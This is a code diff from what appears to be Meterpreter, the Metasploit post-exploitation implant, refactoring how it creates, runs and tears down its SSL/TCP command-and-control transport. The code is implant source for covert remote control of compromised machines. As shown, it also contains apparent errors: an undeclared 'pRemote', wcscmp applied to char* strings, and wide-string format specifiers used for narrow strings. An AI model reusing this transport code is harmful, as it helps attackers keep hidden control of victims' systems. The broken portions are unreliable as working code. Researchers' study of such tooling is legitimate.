@@ -527,41 +527,56 @@ BOOL configure_tcp_connection(Remote* remote, SOCKET socket)
 	return TRUE;
 }
 
-BOOL transport_create(Remote* remote)
+void transport_destroy_tcp(Remote* remote)
 {
-	char* transport = remote->pNextTransportType;
-	char* url = remote->pNextTransportUrl;
-
-	dprintf("[TRANSPORT] Type = %s", transport);
-	dprintf("[TRANSPORT] URL = %s", url);
-
-	remote->transport = (Transport*)malloc(sizeof(Transport));
-	memset(remote->transport, 0, sizeof(Transport));
-
-	remote->transport->url = url;
-
-	if (strcmp(transport, "TRANSPORT_SSL") == 0)
+	if (remote && remote->transport)
 	{
-		TcpTransportContext* ctx = (TcpTransportContext*)malloc(sizeof(TcpTransportContext));
-
-		memset(ctx, 0, sizeof(TcpTransportContext));
-
-		remote->transport->packet_receive = packet_receive_via_ssl;
-		remote->transport->packet_transmit = packet_transmit_via_ssl;
-		remote->transport->transport_init = configure_tcp_connection;
-		remote->transport->transport_deinit = server_destroy_ssl;
-		remote->transport->server_dispatch = server_dispatch;
-		remote->transport->get_socket = tcp_transport_get_socket;
-		remote->transport->ctx = ctx;
-		remote->transport->type = METERPRETER_TRANSPORT_SSL;
+		dprintf("[TRANS TCP] Destroying tcp transport for url %S", remote->transport->url);
+		SAFE_FREE(remote->transport->url);
+		SAFE_FREE(remote->transport);
 	}
-	else // TODO: add more transports over time
+}
+
+Transport* transport_create_tcp(char* url)
+{
+	Transport* transport = (Transport*)malloc(sizeof(Transport));
+	TcpTransportContext* ctx = (TcpTransportContext*)malloc(sizeof(TcpTransportContext));
+
+	dprintf("[TRANS TCP] Creating tcp transport for url %s", url);
+
+	memset(transport, 0, sizeof(Transport));
+	memset(ctx, 0, sizeof(TcpTransportContext));
+
+	transport->url = strdup(url);
+	transport->packet_receive = packet_receive_via_ssl;
+	transport->packet_transmit = packet_transmit_via_ssl;
+	transport->transport_init = configure_tcp_connection;
+	transport->transport_deinit = server_destroy_ssl;
+	transport->transport_destroy = transport_destroy_tcp;
+	transport->server_dispatch = server_dispatch;
+	transport->get_socket = tcp_transport_get_socket;
+	transport->ctx = ctx;
+	transport->type = METERPRETER_TRANSPORT_SSL;
+
+	return transport;
+}
+
+Transport* transport_create(char* transport, char* url)
+{
+	Transport* t = NULL;
+	dprintf("[TRANSPORT] Type = %S", transport);
+	dprintf("[TRANSPORT] URL = %S", url);
+
+	if (wcscmp(transport, L"TRANSPORT_SSL") == 0)
 	{
-		dprintf("[SETUP] Not supported");
-		return FALSE;
+		t = transport_create_tcp(url);
+	}
+	else
+	{
+		dprintf("[TRANSPORT] not supported");
 	}
 
-	return TRUE;
+	return t;
 }
 
 /*
@@ -599,26 +614,17 @@ DWORD server_setup(SOCKET fd)
 	register_dispatch_routines();
 
 	// allocate the "next transport" information
-	remote->pNextTransportType = strdup(global_meterpreter_transport + 12);
-	remote->pNextTransportUrl = strdup(global_meterpreter_url);
+	dprintf("[SERVER] creating transport");
+	remote->nextTransport = transport_create(global_meterpreter_transport + 12, global_meterpreter_url);
 
-	while (remote->pNextTransportType && remote->pNextTransportUrl) {
-		dprintf("[SERVER] creating transport");
-		if (!transport_create(remote)) {
-			break;
-		}
+	while (remote->nextTransport) {
+		remote->transport = remote->nextTransport;
+		remote->nextTransport = NULL;
 
 		dprintf("[SERVER] initialising transport 0x%p", remote->transport->transport_init);
 		if (remote->transport->transport_init && !remote->transport->transport_init(remote, fd)) {
 			break;
 		}
-
-		// clear out the transport details, they'll be added elsewhere if the
-		// transport needs to be hotswapped
-		free(remote->pNextTransportType);
-		free(remote->pNextTransportUrl);
-		remote->pNextTransportType = NULL;
-		remote->pNextTransportUrl = NULL;
 
 		dprintf("[SERVER] Entering the main server dispatch loop for transport %x, context %x", remote->transport, remote->transport->ctx);
 		remote->transport->server_dispatch(remote, dispatchThread);
@@ -627,8 +633,7 @@ DWORD server_setup(SOCKET fd)
 			remote->transport->transport_deinit(remote);
 		}
 
-		free(remote->transport);
-		remote->transport = NULL;
+		pRemote->transport->transport_destroy(pRemote);
 	}
 
 	dprintf("[SERVER] Deregistering dispatch routines...");
@@ -637,7 +642,7 @@ DWORD server_setup(SOCKET fd)
 	remote_deallocate(remote);
 
 out:
-  res = GetLastError();
+	res = GetLastError();
 
 	dprintf("[SERVER] Finished.");
 	return res == ERROR_SUCCESS;
